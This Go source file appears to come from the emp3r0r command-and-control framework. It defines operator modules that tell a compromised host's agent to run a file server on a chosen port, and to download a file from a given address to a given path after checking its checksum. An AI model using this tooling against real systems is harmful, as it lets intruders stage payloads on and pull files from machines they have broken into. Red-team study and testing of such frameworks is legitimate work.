package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleFileServer() {
	switchOpt, ok := runtime_def.AvailableModuleOptions["switch"]
	if !ok {
		logging.Errorf("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := runtime_def.AvailableModuleOptions["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_def.C2CmdFileServer, portOpt.Val, server_switch)
	err := agents.SendCmd(cmd, "", runtime_def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := runtime_def.AvailableModuleOptions[opt]; !ok {
			logging.Errorf("Option '%s' not found", opt)
			return
		}
	}

	download_addr := runtime_def.AvailableModuleOptions["download_addr"].Val
	checksum := runtime_def.AvailableModuleOptions["checksum"].Val
	path := runtime_def.AvailableModuleOptions["path"].Val

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_def.C2CmdFileDownloader, download_addr, checksum, path)
	err := agents.SendCmdToCurrentAgent(cmd, "")
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
